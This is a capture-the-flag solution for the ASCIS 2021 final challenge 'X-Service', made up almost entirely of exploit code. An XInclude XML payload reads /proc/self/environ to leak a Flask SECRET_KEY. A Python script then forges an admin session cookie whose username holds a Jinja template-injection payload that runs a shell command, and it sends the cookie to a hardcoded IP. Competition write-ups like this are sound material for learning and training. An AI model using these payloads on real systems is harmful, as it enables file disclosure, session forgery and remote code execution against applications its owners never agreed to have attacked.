# ============= ASCIS 2021 - Final =============  
<hr />  
    
## X-Service  
  
### 1. Get `SECRET_KEY`  
```xml   
<root><attr xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="/proc/self/environ"/></attr></root>  
```  
  
### 2. SSTI -> RCE  
```python3  
#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests
import re
class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
	r = requests.Session()
	sk = '5a0f483d618eeff039b014e224c3c069' # SECRET_KEY
	sessionDict = {"is_admin":1,"username":"{%print lipsum.__globals__['os'].popen('/readflag').read()%}"}
	cookie = encodeFlaskCookie(sk, sessionDict)
	resp = r.get("http://34.124.209.122:1337/manage", cookies={'session':cookie})
	print("ASCIS{" + re.findall(r'ASCIS{(.*)}',resp.text)[0] + "}")
  ```
